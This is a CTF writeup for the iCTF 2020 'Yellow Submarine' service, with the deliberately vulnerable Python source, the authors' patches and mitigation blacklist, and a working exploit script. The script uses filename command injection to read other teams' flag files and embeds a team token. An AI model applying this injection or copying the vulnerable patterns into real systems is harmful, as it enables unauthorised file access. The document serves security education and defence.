---
layout: post
title: "iCTF 2020: Yellow Submarine"
author: exo
categories: writeup
tags: [cat/web, cat/crypto, lang/python, vuln/injection]
---

## Introduction

This is a writeup for the "Yellow Submarine" service of the iCTF 2020. I
participated as part of cyberwehr and worked together with dmarth and Manuel.

## Challenge Description

> The earth is no longer safe to live in 2047. We will be building yellow
> submarines (Noah's ark for the twenty-first century) and have our own ecosystem.
>
> Flag ids: flag_id is the filename that contains the flag.
>
> Author: Mystiz

## Analysis

As all services of this CTF, the application was running inside of Docker,
exposing the service via `socat`. It only consisted of a single Python file
called `main.py`. When connecting via TCP port `10002`, the user is greeted with
ASCII art and a prompt:

```html
 __ __     _ _              _____     _                 _         
|  |  |___| | |___ _ _ _   |   __|_ _| |_ _____ ___ ___|_|___ ___ 
|_   _| -_| | | . | | | |  |__   | | | . |     | .'|  _| |   | -_|
  |_| |___|_|_|___|_____|  |_____|___|___|_|_|_|__,|_| |_|_|_|___|
                                                                  

Welcome to the Yellow Submarine, the Noah's ark in the twenty-first century.
Your secrets will be securely stored deep in the sea.

yellow-submarine$ 
```

Analyzing the source code, we see that there are four valid commands:

- **`exit`**: Stops the connection. Nothing special here.
- **`keygen`**: First this command asks for a proof of work to avoid DDoS
  attacks on the service. After successful completion of the PoW, an 2048-bit
  RSA key is generated and stored as `signer_{uuid}.key`, where `{uuid}` is a
  randomly generated UUID. This key is also stored for the session.
- **`store`**: This command requires the prior invocation of `keygen` or `read`,
  because the variables `key` and `key_id` must be set. It asks for a filename
  and a base64 encoded secret, which may not be larger than 1000 bytes. Then a
  random AES128 key is generated and used to encrypt the secret in AES-CBC mode
  with a hardcoded nonce of all zeros. Then the ciphertext is stored in
  `data_{filename}` and the key in `data_{filename}.key`. At last, a token is
  generated, consisting of 5 strings seperated by "`|`" symbols:
    - `key_id`: the uuid of the previously generated key
    - `cmd_f`: `cat data_{filename}`
    - `cmd_kf`: `cat data_{filename}.key`
    - `sig_f`: RSA signature of `cmd_f`
    - `sig_kf`: RSA signature of `cmd_kf`
- **`read`**: This command asks for a token in the format described above. It
  loads an RSA key from `signer_{key_id}.key` (in standard PEM format) and then
  verifies the two signatures. It then executes the two commands and uses the
  resulting output as ciphertext and key. It then performs AES decryption and
  prints the secret plaintext.

## Vulnerabilities and Mitigations
While reading through the code, a lot of bad practices and potential security
vunlerabilities became apparent.

### Command injection in filename
Probably the most obvious red flag was the call to `os.popen` durig the `read`
command. If an attacker manages to add commands to the filename, they can for
instance print all files on the server.

**Mitigations**: The first countermeasure we took was to blacklist certain
strings from being part of the filename, preventing some command injections and
file traversals.

```python
  for blacklist in ["base32", "base64", "signer_", "/", ";", "&", "|", " ", "echo"]:
    if blacklist in filename:
      raise Exception('NONONO')
```

We also implemented a similar filter for the `key_id` during the `read` command,
but removed some entries due to our service failing to operate correctly.

```python
  for blacklist in ["base32", "base64", "signer_", "echo", "&", "|", ";", " "]:
    for f in [key_id]:
      if blacklist in f.decode('utf-8'):
        raise Exception('NONONO2')
```

(Note: The failure was most probably not caused by this filter, but we only get
to test our mitigations once every tick and we loose valuable points every time
it is down.)

As this filter does not acutally mitigate the issue we wanted to remove the
command execution entirely and just open the file during the `read` command
instead of executing commands. This worked perfectly for us, but the service
checker was not happy with our solution and marked us as down. At some point
during the CTF we realized that the checker must perform a more useful
verification of the RSA signature than our service, which implies that no
changes to the command are allowed. We then implemented our patch without
changing the token and just removed the `cat` after decoding the token:

```python
  # original
  with os.popen(cmd_f) as f: ciphertext = f.read()
  with os.popen(cmd_kf) as f: data_key = f.read()

  # patched
  cmd_f = cmd_f[4:]
  cmd_kf = cmd_kf[4:]
  with open(cmd_f, "rb") as f: ciphertext = f.read()
  with open(cmd_kf, "rb") as f: data_key = f.read()
```

### Exception handling
The exception handler printed the name of the exception, which could lead to
information disclosure. We also mistakenly assumed that the exception message is
printed, which is not the case.

*Mitigations*: We replaced the exception message with a static string:

```python
  # original
  except Exception as err:
    print('\033[031mError: %s\033[0m' % err)

  #patched
  except Exception as err:
    print('Error')
```

### AES mode
AES-CBC mode is known to be vulnerable to padding oracle attacks. The fact that
the padding is done manually could also be a hint that there is some problem
with the padding. Also a static nonce was used instead of prepending the nonce
to the ciphertext.

*Mitigations*: To prevent attacks targeting the known static nonce, we changed
the nonce to another value, which did not lead to any disruptions in our uptime,
even though we would expect the service to return invalid flags for previously
stored ones, suggesting that the game server did not care for older flags.

```python
  # original
  cipher = AES.new(data_key, AES.MODE_CBC, '\x00' * 16)

  # patched
  cipher = AES.new(data_key, AES.MODE_CBC, '\x69' * 16)
```

### RSA signature generation
The signatures are generated individually for the filename and the keyfile,
allowing an attacker to change those two parts of the token individually. As
normal use of the token never disassociates those two, we implemented a check to
prevent unrelated files to be used:

```python
  if cmd_f + ".key" != cmd_kf:
    raise Exception('HIHIHIHI')
```

### RSA signature verification
The verification of the RSA signatures is done in an unusual way. Normally one
would use the public key to verify the authenticity of the signature. In this
case, the private key is used to sign the message again and the resulting
signature is compared to the tested signature. This does not necessarily lead to
a vulnerability, but it allows changing the format of the signature without
disrupting the functionality of the application. Sadly the organizers checked
the signature in their checker, which made this countermeasure invalid:

```python
  # original
  return base64.b64encode(signature)

  # patched (not allowed by checker)
  return base64.b64encode(b"lol" + signature + b"lol")
```

The more critical vulnerability was overlooked by us, which is that the signing
function has no check if the signed message is actually in the field
(`0 <= m < n`), which allows a signature forgery attack. The organizers published an
exploit which uses this to forge a signature for `cat data_%s #` with an
arbitrary padding, excluding null bytes (the rest of the command is interpreted
as a comment).

*Mitigation*: As this vulnerability is only exploitable in combination with the
command execution, we unknowingly fixed this. Doing a better signature
verification using the public key would also have fixed the issue.

### File extension
Because the ciphertext file does not have a file extension, an attacker can
enter i.e. `target.key` as filename, potentially overwriting another users file
or using the key as ciphertext. We were not successful in exploiting this as the
service saves all files in a directory where no later changes to the files were
allowed and storing a secret is only successful if both the ciphertext and the
key can be successfully written to.

*Mitigations*: We missed the opportunity to rename the files on the server while
keeping the public interface the same. This would have prevented automated
exploits that directly access the file (like our command injection attack).

### File directory traversal
There are alt least two distinct file directory traversal issues in the code.
The first is in the `keygen` command, where the filename could contain arbitrary
characters including `../`. The second is in the `read` command where the
`key_id`, `cmd_f` and `cmd_kf` have the same kind of issue. `cmd_f` and `cmd_kf`
must have a valid signature, but `key_id` is just used to generate the filename
for the RSA private key. This could have been a severe vulnerability, if the
server contained an RSA private key that is the same for all teams. Sadly the
docker did not contain such a key. The other option would have been to place a
keyfile ourselves, but we were not able to do so without also exploiting the
more trivial command execution vulnerability, which defeats the purpose of
writing another exploit. It would have been useful to place a key in the early
stages of the event and thereby have a persistent key on all targets, even after
they patched the command injection, but we were too late for this measure to be
effective.

*Mitigations*: We already mitigated this problem when implementing our blacklist
solution to the command execution vulnerability.

### Key generation
The use of `random.getrandbits` is not advised for cryptographic purposes, as
the state can be reconstructed from given output. Invoking the `keygen` command
leaks this state, which is later used to create the AES key. Sadly we overlooked
this during the CTF, as together with the path traversal in `key_id`, we could
have created a second exploit.

*Mitigation*: Using a better key generation technique (like the one that is
already integrated in the Python crypto library) would have prevented this
attack.


## Attacks

We managed to write a simple attack script which uses the command injection to
read files created by other users of the service. As the service executes
`cat data_{filename}` and `cat data_{filename}.key` respectively, we chose
`x data_xxxxxx` as filename, which expands to `cat data_x data_xxxxxx` and
`cat data_x data_xxxxxx.key`. The `cat` command prints a warning when an invalid vile
is entered, but continues with the next file afterwards. Therefore the flag file
is decrypted with the corresponding key and we get the flag. The exploit is also
included in the files section of this report.


## Intended solution

According to the organizers, these were the intended vulnerabilities:
([source](https://github.com/shellphish/ictf-2020-challs-public/blob/master/yellow_submarine/scripts/exploit))

1. `read` method should not be overwriting `key` and `key_id`, which is used in `store`
2. `random.getrandbits` should not be used as it generates predictable states
3. `read` method should not be containing `os.popen`, which is open to remote code execution
4. `sign` method should be accepting 0 <= m < n only

Analysis after the CTF showed that:

1. Vulnerability number one was mistaken as intended behavior, as loading a
   token and then adding new files could have been a legitimate use case.
2. Number two was mitigated by changing the IV, which changes the ciphertext and
   therefore makes attacks on the key useless.
3. Number three was identified early on and mitigated.
4. We did not see this vulnerabilitiy, but as the example exploit shows, it is
   not exploitable without the command injection.

## Summary

All in all it was a fairly nice CTF challenge. We did not identify all of the
vulnerabilities, but apparently mitigated all of them by fixing the command
injection and taking other protective measures.

## Files

### main.py (original)

```python
#!/usr/bin/env python
# -*- coding: UTF-8 -*-

import uuid
import signal
import base64
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
import os
import random
import hashlib

banner = '''
 __ __     _ _              _____     _                 _         
|  |  |___| | |___ _ _ _   |   __|_ _| |_ _____ ___ ___|_|___ ___ 
|_   _| -_| | | . | | | |  |__   | | | . |     | .'|  _| |   | -_|
  |_| |___|_|_|___|_____|  |_____|___|___|_|_|_|__,|_| |_|_|_|___|
                                                                  

Welcome to the Yellow Submarine, the Noah's ark in the twenty-first century.
Your secrets will be securely stored deep in the sea.
'''

def number_to_base64(n, size):
  assert n < 256**size
  return base64.b64encode(format(n, '0%dx' % (2*size)).decode('hex'))

def sign(key, message):
  message = base64.b64decode(message)
  m = int(message.encode('hex'), 16)
  n, d = key.n, key.d
  s = pow(m, d, n)
  signature = format(s, '0512x').decode('hex')
  return base64.b64encode(signature)

def verify(key, message, signature):
  return sign(key, message) == signature

def pad(plaintext):
  padding = 16 - len(plaintext) % 16
  return plaintext + chr(padding) * padding

def timeout_handler():
  raise EOFError

def main():
  signal.signal(signal.SIGALRM, timeout_handler)
  signal.alarm(60)

  print(banner)
  key_id, key = None, None
  while True:
    try:
      action = raw_input('yellow-submarine$ ')
      if action == 'keygen':
        challenge = format(random.getrandbits(16), '04x')
        prefix = format(random.getrandbits(32), '08x')
        print('Please solve the given proof-of-work challenge: %s|%s.' % (challenge, prefix))
        resp = raw_input('> ')
        if not hashlib.sha256(prefix + resp).hexdigest().startswith(challenge): raise Exception('Incorrect proof-of-work response')
        key = RSA.generate(2048)
        key_id = uuid.uuid4()
        with open('signer_%s.key' % key_id, 'w') as f:
          f.write(key.exportKey())
        print('n = %s' % number_to_base64(key.n, 2048//8))
        print('e = %s' % number_to_base64(key.e, 2048//8))
      elif action == 'store':
        if not key or not key_id: raise Exception('Key not generated')
        print('Please send me a filename')
        filename = raw_input('> ').strip()
        print('Please tell me your secret (base64 encoded). It will be stored very securely!')
        plaintext = base64.b64decode(raw_input('> '))
        if len(plaintext) > 1000: raise Exception('Secret too long')
        padded_plaintext = pad(plaintext)
        k = format(random.getrandbits(128), '032x').decode('hex')
        cipher = AES.new(k, AES.MODE_CBC, '\x00' * 16)
        ciphertext = cipher.encrypt(padded_plaintext)
        with open('data_%s' % filename, 'w') as f: f.write(ciphertext)
        with open('data_%s.key' % filename, 'w') as f: f.write(k)
        cmd_f = base64.b64encode('cat data_%s' % filename)
        sig_f = sign(key, cmd_f)
        cmd_kf = base64.b64encode('cat data_%s.key' % filename)
        sig_kf = sign(key, cmd_kf)
        token = '%s|%s|%s|%s|%s' % (key_id, cmd_f, cmd_kf, sig_f, sig_kf)
        print('Secret stored. You can use the following token to extract the secret securely later:')
        print(token)
      elif action == 'read':
        print('Please send me the token to read the file')
        token = raw_input('> ')
        key_id, cmd_f, cmd_kf, sig_f, sig_kf = token.split('|')
        with open('signer_%s.key' % key_id) as f: key = RSA.importKey(f.read())
        if not verify(key, cmd_f, sig_f) or not verify(key, cmd_kf, sig_kf): raise Exception('Invalid signature')
        cmd_f = base64.b64decode(cmd_f)
        cmd_kf = base64.b64decode(cmd_kf)
        with os.popen(cmd_f) as f: ciphertext = f.read()
        with os.popen(cmd_kf) as f: data_key = f.read()
        cipher = AES.new(data_key, AES.MODE_CBC, '\x00' * 16)
        plaintext = cipher.decrypt(ciphertext)
        print('Hey. This is your secret:')
        print(base64.b64encode(plaintext))
      elif action == 'exit':
        break
    except EOFError:
      break
    except Exception as err:
      print('\033[031mError: %s\033[0m' % err)
  print('Bye!')

if __name__ == '__main__':
  main()

'''
Note:
* The token format must not be changed.
* Proof-of-work difficulty must be 2^16 (i.e. 4 hex characters).
'''

```

### main.py (patched)

```python
#!/usr/bin/env python
# -*- coding: UTF-8 -*-

import uuid
import signal
import base64
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
import os
import random
import hashlib

banner = '''
 __ __     _ _              _____     _                 _         
|  |  |___| | |___ _ _ _   |   __|_ _| |_ _____ ___ ___|_|___ ___ 
|_   _| -_| | | . | | | |  |__   | | | . |     | .'|  _| |   | -_|
  |_| |___|_|_|___|_____|  |_____|___|___|_|_|_|__,|_| |_|_|_|___|
                                                                  

Welcome to the Yellow Submarine, the Noah's ark in the twenty-first century.
Your secrets will be securely stored deep in the sea.
'''

def number_to_base64(n, size):
  assert n < 256**size
  return base64.b64encode(format(n, '0%dx' % (2*size)).decode('hex'))

def sign(key, message):
  message = base64.b64decode(message)
  m = int(message.encode('hex'), 16)
  n, d = key.n, key.d
  s = pow(m, d, n)
  signature = format(s, '0512x').decode('hex')
  return base64.b64encode(signature)

def verify(key, message, signature):
  return sign(key, message) == signature

def pad(plaintext):
  padding = 16 - len(plaintext) % 16
  return plaintext + chr(padding) * padding

def timeout_handler():
  raise EOFError

def main():
  signal.signal(signal.SIGALRM, timeout_handler)
  signal.alarm(60)

  print(banner)
  key_id, key = None, None
  while True:
    try:
      action = raw_input('yellow-submarine$ ')
      if action == 'keygen':
        challenge = format(random.getrandbits(16), '04x')
        prefix = format(random.getrandbits(32), '08x')
        print('Please solve the given proof-of-work challenge: %s|%s.' % (challenge, prefix))
        resp = raw_input('> ')
        if not hashlib.sha256(prefix + resp).hexdigest().startswith(challenge): raise Exception('Incorrect proof-of-work response')
        key = RSA.generate(2048)
        key_id = uuid.uuid4()
        with open('signer_%s.key' % key_id, 'w') as f:
          f.write(key.exportKey())
        print('n = %s' % number_to_base64(key.n, 2048//8))
        print('e = %s' % number_to_base64(key.e, 2048//8))
      elif action == 'store':
        if not key or not key_id: raise Exception('Key not generated')
        print('Please send me a filename')
        filename = raw_input('> ').strip()

        for blacklist in ["base32", "base64", "signer_", "/", ";", "&", "|", " ", "echo"]:
          if blacklist in filename:
            raise Exception('NONONO')

        print('Please tell me your secret (base64 encoded). It will be stored very securely!')
        plaintext = base64.b64decode(raw_input('> '))
        if len(plaintext) > 1000: raise Exception('Secret too long')
        padded_plaintext = pad(plaintext)
        k = format(random.getrandbits(128), '032x').decode('hex')
        cipher = AES.new(k, AES.MODE_CBC, '\x69' * 16)
        ciphertext = cipher.encrypt(padded_plaintext)
        with open('data_%s' % filename, 'w') as f: f.write(ciphertext)
        with open('data_%s.key' % filename, 'w') as f: f.write(k)
        cmd_f = base64.b64encode('cat data_%s' % filename)
        sig_f = sign(key, cmd_f)
        cmd_kf = base64.b64encode('cat data_%s.key' % filename)
        sig_kf = sign(key, cmd_kf)
        token = '%s|%s|%s|%s|%s' % (key_id, cmd_f, cmd_kf, sig_f, sig_kf)
        print('Secret stored. You can use the following token to extract the secret securely later:')
        print(token)
      elif action == 'read':
        print('Please send me the token to read the file')
        token = raw_input('> ')
        key_id, cmd_f, cmd_kf, sig_f, sig_kf = token.split('|')

        for blacklist in ["base32", "base64", "signer_", "echo", "&", "|", ";", " "]:
          for f in [key_id]:
            if blacklist in f.decode('utf-8'):
              raise Exception('NONONO2')

        with open('signer_%s.key' % key_id) as f: key = RSA.importKey(f.read())
        if not verify(key, cmd_f, sig_f) or not verify(key, cmd_kf, sig_kf): raise Exception('Invalid signature')
        cmd_f = base64.b64decode(cmd_f)
        cmd_kf = base64.b64decode(cmd_kf)
        cmd_f = cmd_f[4:]
        cmd_kf = cmd_kf[4:]

        if cmd_f + ".key" != cmd_kf:
          raise Exception('HIHIHIHI')

        with open(cmd_f, "rb") as f: ciphertext = f.read()
        with open(cmd_kf, "rb") as f: data_key = f.read()
        cipher = AES.new(data_key, AES.MODE_CBC, '\x69' * 16)
        plaintext = cipher.decrypt(ciphertext)
        print('Hey. This is your secret:')
        print(base64.b64encode(plaintext))
      elif action == 'exit':
        break
    except EOFError:
      break
    except Exception as err:
      print('Error')
      #print('\033[031mError: %s\033[0m' % err)
  print('Bye!')

if __name__ == '__main__':
  main()

'''
Note:
* The token format must not be changed.
* Proof-of-work difficulty must be 2^16 (i.e. 4 hex characters).
'''

```

### exploit.py

```python
#!/usr/bin/env python

import hashlib
import time
import sys
from pwn import *
import base64
import random

from swpag_client import Team
t = Team("http://teaminterface.ictf.love/", "Uh5QNxSqREyKt0NM3LqL")

def proof_of_work(challenge, prefix):
    for nonce in range(2**24):
        if hashlib.sha256((prefix+str(nonce)).encode("utf-8")).hexdigest().startswith(challenge):
            return str(nonce)

    return ""

def solve_pow(inp):
    (challenge, prefix) = inp.split("|")
    return proof_of_work(challenge, prefix)

def con(ip):
    r = remote(ip, 10002, timeout=5)
    return r

def keygen(r):
    r.recvuntil("yellow-submarine$ ")
    r.sendline("keygen")
    r.recvuntil("Please solve the given proof-of-work challenge: ")
    chal = r.recvuntil(".")[:-1]
    sol = solve_pow(chal.decode("utf-8"))
    r.sendline(str(sol))
    r.readline()
    n_data = base64.b64decode(r.readline().strip().split(b" = ")[-1])
    e_data = base64.b64decode(r.readline().strip().split(b" = ")[-1])

    return (n_data, e_data)

def store(r, filename, secret):
    r.recvuntil("yellow-submarine$ ")
    r.sendline("store")
    r.recvuntil("> ")
    r.sendline(filename)
    r.recvuntil("> ")
    r.sendline(base64.b64encode(secret))
    r.recvuntil("securely later:\n")
    token = r.readline()
    return token

def read(r, token):
    r.recvuntil("yellow-submarine$ ")
    r.sendline("read")
    r.recvuntil("> ")
    r.sendline(token)
    secret = r.recvuntil("yellow-submarine$ ", timeout=6)
    #secret = base64.b64decode(r.readline())
    return secret

def exploit(ip, flagid):
    r = con(ip)
    keygen(r)
    token = store(r, 'x data_%s' % (flagid,), b"hellofromcyberwehr")
    secret = read(r, token)
    return base64.b64decode(secret.split("\n")[1])[:16]

if __name__ == '__main__':
    while True:
        for team in t.get_targets("yellow_submarine"):
            flag = exploit(team["hostname"], team["flag_id"])
            print ("team ", team["team_name"], "flag", flag)
            print t.submit_flag([flag])

        print "done"
        print ""
        print ""
        print ""
        time.sleep(5*60)

```
